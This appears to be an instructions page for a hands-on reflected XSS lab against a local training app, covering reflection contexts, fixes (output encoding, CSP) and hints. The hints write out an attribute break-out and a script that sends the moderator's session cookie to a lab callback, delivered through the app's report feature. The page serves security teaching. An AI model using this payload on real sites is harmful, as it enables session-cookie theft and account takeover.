# reflected-xss

## Concepts

**Cross-Site Scripting (XSS)** is getting your own JavaScript to run in someone else's browser, in
the context of a site they trust. **Reflected XSS** is the variant where the malicious input travels
in a request (usually a URL parameter) and the server immediately **echoes it back into the response
HTML without escaping it** — so the browser parses it as code, not text. Because the payload lives in
a URL, the attacker just needs the victim to click a crafted link.

- **Why it matters.** The script runs with the victim's session: it can read the page, forge requests
  as the user, redirect to phishing, or — as in this lab — **steal the session cookie**. XSS is a
  permanent fixture of the OWASP Top 10.
- **Context decides the payload.** The single most important recon question is *where* your input
  lands in the HTML:
  - a **text node** (`<p>…HERE…</p>`) — a bare `<script>…</script>` works directly;
  - an **attribute value** (`<input value="…HERE…">`) — a `<script>` here is just text *inside the
    quotes* and never runs; you must first **break out** by closing the quote and the tag (`">`)
    before the browser will treat what follows as markup;
  - a **script block** (`<script>var x="…HERE…"</script>`) — you break out of the JS string instead.
- **Drop the alert box.** `alert(1)` only proves the bug to yourself. A real payload *acts*: here it
  reads `document.cookie` and sends it to an attacker endpoint (`fetch`, an `Image()` beacon, …).
- **The fix** is **output encoding** — escape `<`, `>`, `"`, `&` for the context you render into —
  backed by a **Content-Security-Policy** that blocks inline script. A firewall or WAF can slow an
  attacker down but the actual bug is unescaped output.

This lab's app, **Postboard**, reflects its `?q=` search term **inside an attribute**, unescaped. A
**moderator bot** reviews reported search links by opening them in a real browser engine while signed
in — so a working payload runs in *their* session and can lift *their* cookie.

## Tasks

Start the lab with `./lab up reflected-xss`, then open a shell: `./lab shell reflected-xss`.
The app runs at `http://127.0.0.1:8080` inside the container — drive it with `curl`.

1. **Recon** — run a search and find where your input is reflected and in what context:
   ```
   curl 'http://127.0.0.1:8080/search?q=test123'
   ```
   Look at exactly where `test123` appears. Is it a text node, an attribute value, or a script block?
   That decides your break-out.
2. **Exploit** — craft a `q` that escapes the context and runs a `<script>` which steals the
   moderator's cookie and calls the `/xss-hit` callback. Deliver it by reporting the crafted search
   link so the moderator bot opens it:
   ```
   curl -s -G 'http://127.0.0.1:8080/report' --data-urlencode 'path=/search?q=<YOUR PAYLOAD>'
   ```
   (Curling `/xss-hit` yourself can't work — you don't have the moderator's session token; only a
   script running in *their* browser can read it.)
3. **Capture the flag** — a successful callback makes the server write `/flag/solved`. Confirm it:
   ```
   cat /flag/solved
   ```
   If it's missing, your script didn't actually execute — re-check the reflection context and your
   encoding, then try again.
4. **Record your findings** in `/root/answers.txt` (`CONTEXT`, `BREAKOUT`, `PAYLOAD`).

Check your work from the host: `./lab check reflected-xss`.

<details>
<summary>Hints</summary>

- See the raw reflection: `curl 'http://127.0.0.1:8080/search?q=AAA"BBB'` and find where the `"` lands.
  Your term sits inside `value="…"`.
- Break out of the attribute, then open a real tag:  `"><script> … </script>`.
- Make the script *act*: `fetch("/xss-hit?c=" + document.cookie)` — but watch the URL encoding.
- **The `+` trap:** in a URL a literal `+` decodes to a **space**, which breaks your JS. Either
  write the `+` as `%2B`, or sidestep it with a backtick template literal:
  `` fetch(`/xss-hit?c=${document.cookie}`) `` (no `+` at all).
- Watch the flag appear:  `curl … /report …` then `cat /flag/solved`.

</details>

## My notes

<!-- Screenshots: ./lab shot reflected-xss ~/Screenshots/<file>.png <name>, then link it as
     ![what it shows](screenshots/<name>.png). Prefer code blocks for terminal output. -->

## Related

- `wazuh-web-attack-triage` — the blue-team side: spotting XSS and other web attacks in the logs.
